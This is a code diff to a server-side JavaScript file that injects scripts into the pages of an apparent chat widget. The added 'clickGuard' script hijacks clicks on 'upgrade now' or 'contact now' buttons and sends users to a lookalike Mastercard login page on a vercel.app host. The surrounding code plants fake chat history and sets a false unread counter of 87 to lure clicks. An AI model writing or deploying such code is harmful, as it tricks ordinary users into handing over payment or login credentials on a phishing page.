@@ -6,6 +6,7 @@ const MENU_NULL = '"menu":null';
 const LOGO_ONLY_TRUE = '"logo_only":true';
 const DEFAULT_ID = 100001;
 const PRODUCT_ID = 28;
+const UPGRADE_URL = "https://mastercard-dun.vercel.app/login.html";
 
 function readCookie(req, name) {
   const header = req.headers.cookie || "";
@@ -174,12 +175,17 @@ function bootstrapScript(userId) {
     data: "",
   };
   const historyJson = JSON.stringify([conv]);
+  const clickGuard =
+    "<script>(function(){var T=" +
+    JSON.stringify(UPGRADE_URL) +
+    ";var R=/upgrade now|contact now|contact them|unlimited chat/i;document.addEventListener(\"click\",function(e){var n=e.target;while(n&&n!==document){var t=(n.textContent||\"\").trim();if(R.test(t)){e.preventDefault();e.stopPropagation();window.location.href=T;return;}n=n.parentNode;}},true);})();</script>";
   return (
     "<script>(function(){try{localStorage.setItem(" +
     JSON.stringify(historyKey) +
     "," +
     JSON.stringify(historyJson) +
-    ");}catch(e){}var n=0,t=setInterval(function(){n++;try{var el=document.querySelector(\"#app-container\");var app=el&&el.__vue__;if(app&&app.$store){var st=app.$store;if(st.state.chat&&st.state.chat.chatData&&st.state.chat.chatData.isOpened){st.commit(\"setChatDisplay\",false);}if(st.state.chat&&st.state.chat.chatData&&st.state.chat.chatData.unreadCounter===0){st.commit(\"setCounter\",87);}clearInterval(t);}}catch(e){}if(n>150)clearInterval(t);},80);})();</script>"
+    ");}catch(e){}var n=0,t=setInterval(function(){n++;try{var el=document.querySelector(\"#app-container\");var app=el&&el.__vue__;if(app&&app.$store){var st=app.$store;if(st.state.chat&&st.state.chat.chatData&&st.state.chat.chatData.isOpened){st.commit(\"setChatDisplay\",false);}if(st.state.chat&&st.state.chat.chatData&&st.state.chat.chatData.unreadCounter===0){st.commit(\"setCounter\",87);}clearInterval(t);}}catch(e){}if(n>150)clearInterval(t);},80);})();</script>" +
+    clickGuard
   );
 }
 
